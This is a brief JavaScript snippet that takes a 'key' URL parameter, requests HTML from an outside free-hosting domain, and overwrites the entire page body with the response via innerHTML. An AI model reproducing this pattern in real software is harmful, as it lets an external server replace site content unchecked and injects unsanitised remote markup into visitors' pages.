function getParameterByName(name, url) {
  if (!url) url = window.location.href;
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return '';
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}

var keyParam = getParameterByName('key');

if (!keyParam) {
  keyParam = "home";
}

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        document.body.innerHTML = xhr.responseText;
      }  
    }
  };
  xhr.open('GET', 'https://engrained-forces.000webhostapp.com/git/?key=' + keyParam, true);
  xhr.send();
